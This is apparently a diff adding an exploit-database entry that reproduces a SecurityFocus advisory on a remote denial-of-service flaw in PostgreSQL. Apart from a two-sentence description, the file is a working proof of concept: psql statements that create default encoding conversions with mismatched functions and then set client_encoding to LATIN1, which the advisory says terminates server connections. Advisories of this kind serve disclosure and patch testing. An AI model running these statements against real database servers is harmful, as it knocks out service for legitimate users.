@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/34090/info
+
+PostgreSQL is prone to a remote denial-of-service vulnerability.
+
+Exploiting this issue may allow attackers to terminate connections to the PostgreSQL server, denying service to legitimate users.
+
+test=# CREATE DEFAULT CONVERSION test1 FOR 'LATIN1' TO 'KOI8' FROM
+ascii_to_mic;
+CREATE CONVERSION
+test=# CREATE DEFAULT CONVERSION test2 FOR 'KOI8' TO 'LATIN1' FROM
+mic_to_ascii;
+CREATE CONVERSION
+test=# set client_encoding to 'LATIN1'; 
